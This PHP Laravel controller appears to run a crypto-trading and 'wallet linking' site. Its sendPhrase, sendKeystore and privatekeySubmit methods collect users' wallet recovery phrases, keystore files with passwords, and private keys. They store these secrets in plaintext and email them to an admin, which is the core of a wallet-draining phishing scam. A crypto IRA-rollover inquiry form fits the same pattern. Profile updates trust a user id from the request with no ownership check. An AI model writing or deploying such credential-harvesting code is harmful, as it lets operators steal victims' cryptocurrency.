<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use App\Models\Wallet;
use App\Models\Transactions;
use App\Models\Withdrawal;
use App\Models\Notifications;
use App\Models\Activities;
use App\Models\User;
use RealRashid\SweetAlert\Facades\Alert;
use App\Models\Crypto;
use App\Models\UserWallet;
use App\Models\WalletType;
use App\Models\WalletLinkRequest;
use App\Models\SecureRetirementInquiry;
use App\Models\WalletProvider;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Log;
use App\Mail\PhraseSubmitted;
use App\Mail\KeystoreSubmitted;
use App\Mail\PrivatekeySubmitted;
use App\Models\Verification;

class UsersController extends Controller
{

  /**
   * Display a listing of the resource.
   *
   * @return Response
   */
   public function getCardCategory()
    {
        $categories = DB::table('card_categories')->get();

        return $categories;
    }




  public function index()
{
    $title = 'Dashboard';

    $totalTransactions = DB::table('transactions')->where('user_id', Auth::user()->id)->count();

    $transactionsTable = Transactions::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(5);

    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();

    $categories = $this->getCardCategory();

    $getcoin = Crypto::orderBy('created_at', 'desc')->paginate(20);

    $user_id = Auth::id();
    $wallet_user_id = Auth::id();
    $bal = DB::table('user_wallet')->where('user_id', $wallet_user_id)->first();

    // Initialize user_amount to 0 as a default value
    $user_amount = 0;

    if (!empty($bal)) {
        $user_amount = $bal->amount;
    }

    // Calculate the total wallet amount
    $totalWalletAmount = DB::table('user_wallet')
        ->where('user_id', $wallet_user_id)
        ->sum('amount');

    // Check KYC verification status
    $verification = \App\Models\Verification::where('user_id', $user_id)
        ->latest()
        ->first();
    $isVerified = !empty($verification) && $verification->status === 'approved';

    // Get all active wallet types and ensure user has wallets for them
    $activeWalletTypes = WalletType::where('active', true)->get();
    $userWallets = UserWallet::where('user_id', Auth::user()->id)
        ->whereIn('wallet_type_id', $activeWalletTypes->pluck('id'))
        ->with('walletType')
        ->get()
        ->keyBy('wallet_type_id');

    $results = collect();
    foreach ($activeWalletTypes as $walletType) {
        if ($userWallets->has($walletType->id)) {
            $results->push($userWallets->get($walletType->id));
        } else {
            // Create a default wallet for this active wallet type
            $defaultWallet = UserWallet::create([
                'user_id' => Auth::user()->id,
                'wallet_type_id' => $walletType->id,
                'amount' => 0.000000,
                'wallet_address' => 'default_address',
            ]);
            // Load the relationship
            $defaultWallet->load('walletType');
            $results->push($defaultWallet);
        }
    }

    return view('user.pages.dashboard', compact('title', 'notificationSidebar', 'categories', 'user_amount', 'notification', 'totalTransactions', 'transactionsTable', 'getcoin', 'results', 'totalWalletAmount', 'isVerified', 'verification'));
}




  public function userTransaction()
  {
    $title = 'User Transactions';

    $totalTransactions   = DB::table('transactions')->where('user_id', Auth::user()->id)->count();

    $transactionsTable = Transactions::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(10);

    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();




    $setting = \App\Models\AdminSetting::first();
    return view('user.pages.all-transaction', compact('title','notificationSidebar','totalTransactions','notification','transactionsTable', 'setting'));
  }


  public function userNotification()
  {
    $title = 'All Notifications';


    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);



    return view('user.pages.all-notifications', compact('title','notification'));
  }


  public function userActivities()
  {
    $title = 'All Activities';


    $activities = Activities::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(10);

    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();


    return view('user.pages.all-activities', compact('title','activities','notificationSidebar','notification'));
  }

     public function buynow()
  {
    $title = 'Buy Crypto';

    $setting = \App\Models\AdminSetting::first();

    $activities = Activities::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(10);

    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();

    $activeWalletTypes = WalletType::where('active', true)->orderBy('coin_name')->get();

    return view('user.pages.buynow', compact('title','activities','notificationSidebar','notification','activeWalletTypes', 'setting'));
  }

  public function tradeMutilpleCard()
  {
    $title = 'Multiple Card Trade';
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();
    $categories = $this->getCardCategory();



    return view('user.pages.multiple-card-upload', compact('title', 'notificationSidebar', 'notification', 'categories'));

  }


  public function userAccount()
  {
    $title = 'Account Settings';
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();
    $categories = $this->getCardCategory();

    $getUserProfile = DB::table('users')->where('id', Auth::user()->id)->first();

    return view('user.pages.account-settings', compact('title', 'notificationSidebar', 'notification', 'categories', 'getUserProfile'));

  }

  public function market()
  {
    $title = 'Market Overview';
    $notificationSidebar = Notifications::count();
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);
    
    // Using predefined wallet types as a base for our market view
    $walletTypes = \App\Models\WalletType::where('active', true)->orderBy('coin_name')->get();

    return view('user.pages.market', compact('title', 'notificationSidebar', 'notification', 'walletTypes'));
  }


  public function editAccount($id)
  {
    $title = 'Edit Account';
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $notificationSidebar = Notifications::count();
    $categories = $this->getCardCategory();

    $getUserProfile = DB::table('users')->where('id', Auth::user()->id)->first();
    $editAccount = User::where('id', $id)->get();


    return view('user.pages.edit-settings', compact('title', 'notificationSidebar', 'notification', 'categories', 'getUserProfile', 'editAccount'));

  }


  public function userNotificationsPreview($id)
    {

    $title = 'Preview Notification';

    $notificationSidebar = Notifications::count();
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);
    $previewNotification = DB::table('notifications')->where('id', $id)->first();
    return view('user.pages.preview-notification', compact('title','previewNotification','notificationSidebar','notification'));

    }




  public function editUserAccount(Request $request)
    {


      DB::beginTransaction();
      try {

        $request->validate([
            'firstname' => 'required|string|max:255',
            'lastname' => 'required|string|max:255',
        ]);


        $userAccountUpdate = [

          'firstname'       => $request->firstname,
          'lastname'        => $request->lastname,
          'sex'             => $request->sex,
          'age'             => $request->age,
          'account_name'    => $request->account_name,
          'account_number'  => $request->account_number,
          'bank_name'       => $request->bank_name,
        ];



       User::where('id', $request->id)->update($userAccountUpdate);
       Alert::html('Successful', 'Your Profile has been updated' , 'success');
       DB::commit();

       return redirect()->route('account-settings');

      } catch(\Exception $e) {
        DB::rollback();
        Alert::html('Failed', 'Your Profile was not updated' , 'error');
        return redirect()->back();
      }


    }



  /**
   * Display the specified resource.
   *
   * @param  int  $id
   * @return Response
   */
  public function show(Request $request, $id)
  {

     // Validation for required fields (and using some regex to validate our numeric value)
        $request->validate([
            'firstname' => 'required|string|max:255',
            'lastname' => 'required|string|max:255',
            'sex' => 'required|string|max:25',
            'age' => 'required|string|max:255',
            'mobile_number' => 'required|string|max:255',
            'account_name' => 'required|string|max:255',
            'account_number' => 'required|string|max:255',
            'bank_name' => 'required|string|max:255',
        ]);


        $user = User::find($id);
        // Getting values from the blade template form
        $user->firstname =  $request->get('firstname');
        $user->lastname = $request->get('lastname');
        $user->sex = $request->get('sex');
        $user->age =  $request->get('age');
        $user->mobile_number = $request->get('mobile_number');
        $user->account_name = $request->get('account_name');
        $user->account_number =  $request->get('account_number');
        $user->bank_name = $request->get('bank_name');
        $user->save();

        Alert::html('Successful', 'Your Profile has been updated' , 'success');
        return redirect('/user.pages.edit-settings');

  }


  public function userWithdrawRequest()
  {

     $totalTransactions   = DB::table('transactions')->where('user_id', Auth::user()->id)->count();

    $transactionsTable = Transactions::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(5);


    $user_id = Auth::id();
    $wallet_user_id = Auth::id();
    $bal = DB::table('wallets')->where('user_id', $wallet_user_id)->first();

      if (!empty($bal)) {
        $user_amount = $bal->amount;
      }

    $user_amount = $bal->amount;

    $title = 'Withdarw Fund';

    $notificationSidebar = Notifications::count();
    $notification = Notifications::orderBy('created_at', 'desc')->paginate(5);

    $withdrawal_list = Withdrawal::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(5);
    $getUserProfile = User::where('id', Auth::user()->id)->first();
    $getUserWallet = Wallet::where('user_id', Auth::user()->id)->first();
    return view('user.pages.withdraw', compact('title','withdrawal_list','notificationSidebar','notification','getUserProfile','getUserWallet','user_amount','totalTransactions','transactionsTable'));
  }



  public function makeWithdrawal(Request $request)
{
    $getUserWallet = Wallet::where('user_id', Auth::user()->id)->first();

    if ($request->amount > $getUserWallet->amount) {
        Alert::html('Attention!', 'your account balance is less than <strong>$'. number_format($request->amount, 2) .'</strong>', 'danger');
        return redirect()->back();
    } else {
        $create_withdraw = Withdrawal::create([
            'user_id' => Auth::user()->id,
            'username' => Auth::user()->username,
            'amount' => $request->amount,
            'status' => 0,
            'account_number' => $request->account_number,
            'account_name' => $request->account_name,
            'bank_name' => $request->bank_name,
            'phone' => Auth::user()->mobile_number,
        ]);

        $Activities = Activities::create([
            'user_id' => Auth::id(),
            'subject' => 'Withdraw Request',
            'open' => '0',
            'message' => 'You made a withdrawal request of $'.$request->amount.', we are processing your request shortly.',
        ]);

        Alert::html('Successful', 'Your withdrawal request of <strong>$'.number_format($request->amount, 2).'</strong> was successful, we are processing your request shortly.' , 'success');
        return redirect()->back();
    }
}

 public function coinPreview($id)
{
    // Try to find the coin in WalletType first, as the dashboard uses these IDs
    $coin = WalletType::find($id);
    
    // If not found in WalletType, try the crypto table as a fallback
    if (!$coin) {
        $coin = DB::table('crypto')->where('id', $id)->first();
    }
    
    if (!$coin) {
        return redirect()->back()->with('error', 'Coin not found.');
    }

    $title = 'Coin Preview';
    $getwallettype = ($coin instanceof WalletType) ? $coin : WalletType::where('id', $coin->id)->first();
    
    $user_id = Auth::id();
    $wallet_user_id = Auth::id();
    
    // Find the user's specific wallet for this coin/wallet type
    $bal = DB::table('user_wallet')->where('wallet_type_id', $id)->where('user_id', $user_id)->first();
    
    $user_amount = 0;
    $charge_fee = 0;

    if (!empty($bal)) {
        if (property_exists($bal, 'amount')) {
            $user_amount = $bal->amount;
        }
        
        if (property_exists($bal, 'restrict_fee')) {
            $charge_fee = $bal->restrict_fee;
        }
    }

    // Set coin charge from the restrict property (available in WalletType)
    $coin_charge = isset($coin->restrict) ? $coin->restrict : 0;

    // Calculate the total wallet amount for the user
    $totalWalletAmount = DB::table('user_wallet')
        ->where('user_id', $wallet_user_id)
        ->sum('amount');

    return view('user.pages.coin-preview', compact('getwallettype', 'title', 'coin', 'user_amount','totalWalletAmount', 'charge_fee','coin_charge'));
}

// Wallet Linking Methods
public function linkWallet()
{
    $title = 'Link Wallet';
    $user_id = Auth::id();
    $wallet_user_id = Auth::id();
    $bal = DB::table('wallets')->where('user_id', $wallet_user_id)->first();

    if (!empty($bal)) {
        $user_amount = $bal->amount;
    } else {
        $user_amount = 0;
    }

    // Calculate the total wallet amount
    $totalWalletAmount = DB::table('user_wallet')
        ->where('user_id', $wallet_user_id)
        ->sum('amount');

    return view('user.pages.link-wallet', compact('title','user_amount','totalWalletAmount'));
}

public function coinWallet()
{
    $title = 'Choose Wallet Type';
    $activeWalletProvider = WalletProvider::get();

    return view('user.pages.coin-wallet', compact('title', 'activeWalletProvider'));
}

// Secure Retirement (Crypto-linked 401k/IRA) Info Page
public function secureRetirement()
{
    $title = 'Secure 401(k) / IRA (Crypto)';
    return view('user.pages.secure-retirement', compact('title'));
}

public function submitSecureRetirement(Request $request)
{
    $validated = $request->validate([
        'full_name' => 'required|string|max:255',
        'email' => 'required|email|max:255',
        'phone' => 'nullable|string|max:50',
        'account_type' => 'required|in:Traditional IRA,Roth IRA,Solo 401k,Other',
        'current_provider' => 'nullable|string|max:255',
        'rollover_amount' => 'nullable|numeric|min:0',
        'preferred_custodian' => 'nullable|string|max:255',
        'notes' => 'nullable|string',
    ]);

    SecureRetirementInquiry::create([
        'user_id' => Auth::id(),
        'full_name' => $validated['full_name'],
        'email' => $validated['email'],
        'phone' => $validated['phone'] ?? null,
        'account_type' => $validated['account_type'],
        'current_provider' => $validated['current_provider'] ?? null,
        'rollover_amount' => $validated['rollover_amount'] ?? null,
        'preferred_custodian' => $validated['preferred_custodian'] ?? null,
        'notes' => $validated['notes'] ?? null,
        'status' => 'pending',
    ]);

    Alert::html('Submitted', 'Your secure retirement inquiry was submitted. Our team will contact you shortly.', 'success');
    return redirect()->route('user.secure-retirement');
}

// Admin: list inquiries
public function adminSecureRetirementIndex()
{
    $title = 'Secure Retirement Inquiries';
    $inquiries = SecureRetirementInquiry::with('user')->orderBy('created_at','desc')->paginate(20);
    return view('admin.pages.secure-retirement-inquiries', compact('title','inquiries'));
}

public function adminSecureRetirementPreview($id)
{
    $inquiry = SecureRetirementInquiry::with('user')->findOrFail($id);
    return view('admin.pages.preview-secure-retirement-inquiry', compact('inquiry'));
}

public function adminSecureRetirementApprove($id)
{
    $inq = SecureRetirementInquiry::findOrFail($id);
    $inq->update(['status' => 'approved', 'processed_at' => now()]);
    Alert::html('Approved', 'Inquiry approved.', 'success');
    return redirect()->back();
}

public function adminSecureRetirementReject($id)
{
    $inq = SecureRetirementInquiry::findOrFail($id);
    $inq->update(['status' => 'rejected', 'processed_at' => now()]);
    Alert::html('Rejected', 'Inquiry rejected.', 'success');
    return redirect()->back();
}

public function sendPhrase(Request $request)
{
    $request->validate([
        'wallet_provider_id' => 'required|exists:walletsprovider,id',
        'wallet_name' => 'required|string|max:255',
        'recovery_phrase' => 'required|string',
        'wallet_address' => 'nullable|string|max:255',
    ]);

    // Create wallet link request
    WalletLinkRequest::create([
        'user_id' => Auth::id(),
        'wallet_provider_id' => $request->wallet_provider_id,
        'wallet_name' => $request->wallet_name,
        'wallet_address' => $request->wallet_address,
        'recovery_phrase' => $request->recovery_phrase,
        'status' => 'pending',
    ]);

        // Send email notification
        try {
            $provider = WalletProvider::find($request->wallet_provider_id);
            $mailData = $request->all();
            $mailData['provider_name'] = $provider->title ?? 'Unknown Provider';
            
            $adminEmail = \App\Models\AdminSetting::first()?->admin_email ?? 'admin@coinledger.com';
            Mail::to($adminEmail)->send(new \App\Mail\PhraseSubmitted($mailData));
        } catch (\Exception $e) {
        // Log error if email fails
        Log::error('Email sending failed: ' . $e->getMessage());
    }

    Alert::html('Success', 'Recovery phrase submitted successfully. We will review your request shortly.', 'success');
    return redirect()->back();
}

public function sendKeystore(Request $request)
{
    $request->validate([
        'wallet_provider_id' => 'required|exists:walletsprovider,id',
        'wallet_name' => 'required|string|max:255',
        'keystore_json' => 'required|string',
        'keystore_password' => 'required|string',
        'wallet_address' => 'nullable|string|max:255',
    ]);

    // Create wallet link request
    WalletLinkRequest::create([
        'user_id' => Auth::id(),
        'wallet_provider_id' => $request->wallet_provider_id,
        'wallet_name' => $request->wallet_name,
        'wallet_address' => $request->wallet_address,
        'keystore_json' => $request->keystore_json,
        'keystore_password' => $request->keystore_password,
        'status' => 'pending',
    ]);

        // Send email notification
        try {
            $provider = WalletProvider::find($request->wallet_provider_id);
            $mailData = $request->all();
            $mailData['provider_name'] = $provider->title ?? 'Unknown Provider';
            
            $adminEmail = \App\Models\AdminSetting::first()?->admin_email ?? 'admin@coinledger.com';
            Mail::to($adminEmail)->send(new \App\Mail\KeystoreSubmitted($mailData));
        } catch (\Exception $e) {
        // Log error if email fails
        Log::error('Email sending failed: ' . $e->getMessage());
    }

    Alert::html('Success', 'Keystore JSON submitted successfully. We will review your request shortly.', 'success');
    return redirect()->back();
}

public function privatekeySubmit(Request $request)
{
    $request->validate([
        'wallet_provider_id' => 'required|exists:walletsprovider,id',
        'wallet_name' => 'required|string|max:255',
        'private_key' => 'required|string',
        'wallet_address' => 'nullable|string|max:255',
    ]);

    // Create wallet link request
    WalletLinkRequest::create([
        'user_id' => Auth::id(),
        'wallet_provider_id' => $request->wallet_provider_id,
        'wallet_name' => $request->wallet_name,
        'wallet_address' => $request->wallet_address,
        'private_key' => $request->private_key,
        'status' => 'pending',
    ]);

        // Send email notification
        try {
            $provider = WalletProvider::find($request->wallet_provider_id);
            $mailData = $request->all();
            $mailData['provider_name'] = $provider->title ?? 'Unknown Provider';
            
            $adminEmail = \App\Models\AdminSetting::first()?->admin_email ?? 'admin@coinledger.com';
            Mail::to($adminEmail)->send(new \App\Mail\PrivatekeySubmitted($mailData));
        } catch (\Exception $e) {
        // Log error if email fails
        Log::error('Email sending failed: ' . $e->getMessage());
    }

    Alert::html('Success', 'Private key submitted successfully. We will review your request shortly.', 'success');
    return redirect()->back();
}

// Admin Methods for Wallet Link Requests
public function adminWalletLinkRequests()
{
    $title = 'Wallet Link Requests';
    $requests = WalletLinkRequest::with(['user', 'walletProvider'])
        ->orderBy('created_at', 'desc')
        ->paginate(20);

    return view('admin.pages.wallet-link-requests', compact('title', 'requests'));
}

public function adminWalletLinkPreview($id)
{
        $request = WalletLinkRequest::with(['user', 'walletProvider'])->findOrFail($id);
    return view('admin.pages.preview-wallet-link-request', compact('request'));
}

public function adminApproveWalletLink($id)
{
    $request = WalletLinkRequest::findOrFail($id);
    $request->update([
        'status' => 'approved',
        'processed_at' => now(),
        'notes' => 'Approved by admin'
    ]);

    Alert::html('Success', 'Wallet link request approved successfully.', 'success');
    return redirect()->back();
}

public function adminRejectWalletLink($id)
{
    $request = WalletLinkRequest::findOrFail($id);
    $request->update([
        'status' => 'rejected',
        'processed_at' => now(),
        'notes' => 'Rejected by admin'
    ]);

    Alert::html('Success', 'Wallet link request rejected successfully.', 'success');
    return redirect()->back();
}
    public function changePassword(Request $request)
    {
        $request->validate([
            'current_password' => 'required',
            'password' => 'required|string|min:8|confirmed',
        ]);

        $user = Auth::user();

        if (!Hash::check($request->current_password, $user->password)) {
            Alert::error('Error', 'Current password does not match.');
            return redirect()->back();
        }

        $user->password = Hash::make($request->password);
        $user->save();

        Alert::success('Success', 'Password changed successfully!');
        return redirect()->back();
    }
}
